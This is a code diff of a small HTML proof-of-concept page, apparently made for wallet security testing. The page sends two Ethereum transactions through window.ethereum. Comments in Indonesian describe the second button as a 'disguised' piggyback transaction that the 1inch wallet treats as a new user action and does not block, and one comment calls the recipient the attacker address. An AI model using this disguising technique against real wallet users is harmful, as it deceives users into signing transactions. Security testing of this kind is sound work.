@@ -3,48 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Uji Coba Transaksi Piggybacking</title>
+    <title>Uji Coba Piggybacking</title>
 </head>
 <body>
-    <h1>Uji Coba: Transaction Piggyback</h1>
-    <button id="btn-run" style="padding: 20px; font-size: 18px;">Kirim Transaksi & Piggyback</button>
-    <p id="status">Status: Standby</p>
+    <h1>Langkah Pembuktian</h1>
+    
+    <!-- Tombol Pertama: Transaksi Utama -->
+    <button id="btn-1" style="padding: 20px; font-size: 18px;">Langkah 1: Approve Token</button>
+    
+    <!-- Tombol Kedua: Transaksi Piggyback (Disamarkan) -->
+    <button id="btn-2" style="padding: 20px; font-size: 18px; margin-top: 20px;">Langkah 2: Selesaikan Transaksi</button>
+
+    <div id="status" style="margin-top: 20px;"></div>
 
     <script>
-        const btn = document.getElementById('btn-run');
-        const status = document.getElementById('status');
-
-        btn.addEventListener('click', async () => {
-            status.innerText = "Mengirim Transaksi Sah...";
-            
-            // 1. Kirim transaksi sah
+        // Transaksi 1: Transaksi Sah yang dipicu tombol 1
+        document.getElementById('btn-1').addEventListener('click', async () => {
             try {
-                const tx1 = await window.ethereum.request({
+                await window.ethereum.request({
                     method: 'eth_sendTransaction',
                     params: [{
-                        to: '0x000000000000000000000000000000000000dEaD', // Alamat uji
-                        value: '0x0', 
-                    }],
+                        to: '0x000000000000000000000000000000000000dEaD',
+                        value: '0x0'
+                    }]
                 });
-                status.innerText = "Transaksi 1 dikirim: " + tx1;
-
-                // 2. Skenario Piggyback (Injeksi segera setelah transaksi 1 dipicu)
-                // Di dApp browser, ini meniru perilaku ekstensi yang "menyambar" 
-                // antrean sesaat setelah dApp meminta izin.
-                setTimeout(async () => {
-                    status.innerText = "Melakukan Piggyback...";
-                    await window.ethereum.request({
-                        method: 'eth_sendTransaction',
-                        params: [{
-                            to: '0x000000000000000000000000000000000000dEaD',
-                            value: '0x0',
-                        }],
-                    });
-                    status.innerText = "Transaksi 2 (Piggyback) terkirim.";
-                }, 500);
-
+                document.getElementById('status').innerText = "Langkah 1 Berhasil. Sekarang klik Langkah 2.";
             } catch (err) {
-                status.innerText = "Error/Dibatalkan: " + err.message;
+                document.getElementById('status').innerText = "Gagal: " + err.message;
+            }
+        });
+
+        // Transaksi 2: Transaksi Piggyback yang dipicu tombol 2
+        // Secara teknis ini adalah serangan, tapi di mata dompet 1inch, 
+        // ini adalah "tindakan pengguna baru" sehingga tidak diblokir.
+        document.getElementById('btn-2').addEventListener('click', async () => {
+            try {
+                await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        to: '0x000000000000000000000000000000000000dEaD', // Alamat Penyerang
+                        value: '0x0'
+                    }]
+                });
+                document.getElementById('status').innerText = "Langkah 2 Berhasil!";
+            } catch (err) {
+                document.getElementById('status').innerText = "Gagal: " + err.message;
             }
         });
     </script>
